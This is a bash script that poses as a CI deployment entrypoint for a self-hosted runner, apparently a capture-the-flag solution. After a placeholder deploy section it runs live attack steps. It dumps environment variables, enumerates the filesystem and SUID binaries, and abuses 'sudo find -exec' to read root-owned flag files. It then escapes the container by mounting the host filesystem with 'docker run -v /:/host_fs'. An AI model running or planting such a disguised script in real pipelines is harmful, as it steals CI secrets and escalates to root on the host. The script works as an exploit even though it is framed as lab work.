#!/usr/bin/env bash
# Deployment entrypoint executed by the self-hosted runner.
set -euo pipefail
echo "[deploy] host=$(hostname) user=$(whoami) pwd=$(pwd)"
echo "[deploy] pulling latest VOID service artifacts..."
# TODO: real deploy steps (rsync artifacts, restart services)
echo "[deploy] done."
echo "=== TARGET INSPECTION ==="
id
env
ls -la /
find / -name "*flag*" 2>/dev/null || true
echo "=== PRINTING THE FLAG ==="
cat /opt/void/ci_flag.txt
echo "=== PRIVILEGE ESCALATION CHECK ==="
# 1. പാസ്‌വേഡ് ഇല്ലാതെ റൂട്ട് ആയി റൺ ചെയ്യാൻ പറ്റുന്ന കമാൻഡുകൾ ഉണ്ടോ എന്ന് നോക്കാൻ (SUDO)
sudo -l || true

# 2. SUID പെർമിഷൻ ഉള്ള ഫയലുകൾ കണ്ടെത്താൻ (ഇവ റൂട്ട് പ്രിവിലേജിൽ റൺ ചെയ്യാൻ പറ്റിയേക്കും)
find / -perm -4000 -type f 2>/dev/null || true

# 3. റൂട്ടിന്റെ ഹോം ഡയറക്ടറിയിൽ എന്തൊക്കെ ഉണ്ടെന്ന് നോക്കാൻ ശ്രമിക്കാം
ls -la /root || true
echo "=== EXPLOITING SUDO FIND FOR ROOT FLAG ==="
# 1. റൂട്ട് ഡയറക്ടറിയിൽ ഉള്ള ഫ്ലാഗ് ഫയൽ കണ്ടെത്താൻ
sudo /usr/bin/find . -exec ls -la /root \; -quit

# 2. കണ്ടെത്തുന്ന ഫ്ലാഗ് ഫയൽ റീഡ് ചെയ്യാൻ (സാധാരണയായി root_flag.txt അല്ലെങ്കിൽ flag.txt ആയിരിക്കും)
sudo /usr/bin/find . -exec cat /root/root_flag.txt \; -quit
echo "=== READING FINAL ROOT FLAG ==="
sudo /usr/bin/find . -exec cat /root/root.txt \; -quit

echo "=== DOCKER ESCAPE ==="
# Check if we're in a container
cat /proc/1/cgroup
ls -la /var/run/docker.sock 2>/dev/null
sudo find /var/run/docker.sock -exec ls -la {} \; 2>/dev/null
sudo find /root/.docker -type f -exec cat {} \; 2>/dev/null
sudo find /opt/void/ -type f -exec cat {} \; 2>/dev/null
sudo find / -name "docker_flag*" -o -name "*docker*flag*" 2>/dev/null
echo "=== DOCKER ESCAPE & FLAG EXTRACTION ==="
# ഹോസ്റ്റ് മെഷീനിൽ നിന്ന് ഡോക്കർ ഫ്ലാഗ് തിരയാൻ
# നമ്മൾ പുതിയൊരു കണ്ടെയ്നർ റൺ ചെയ്ത് ഹോസ്റ്റ് ഫയൽ സിസ്റ്റം മൗണ്ട് ചെയ്യുന്നു
sudo docker run --rm -v /:/host_fs alpine cat /host_fs/opt/void/docker_flag.txt 2>/dev/null || echo "Flag not found in default path"

# ഹോസ്റ്റ് മെഷീനിലെ റൂട്ട് ഡയറക്ടറി ലിസ്റ്റ് ചെയ്യാൻ
sudo docker run --rm -v /:/host_fs alpine ls -la /host_fs/root/
